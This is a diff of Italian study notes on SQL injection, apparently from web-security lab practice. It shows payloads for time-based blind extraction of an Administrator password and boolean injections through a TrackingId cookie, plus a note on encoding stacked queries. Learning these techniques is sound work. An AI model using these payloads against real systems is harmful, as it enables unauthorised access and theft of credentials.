@@ -90,7 +90,7 @@ time delay
 time delay per trovare un carattere alla volta
 '; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
 
-sui cookie non serve URL encoding
+sui cookie NON È NECESSARIO URL ENCODING, ma quando si fanno query concatenate con ; serve encodare per mantenere la sintassi
 
 TrackingId=xyz' AND '1'='1 injection sui cookie
 TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a   -> boolean per confermare l'esistenza di una tabella chiamata users
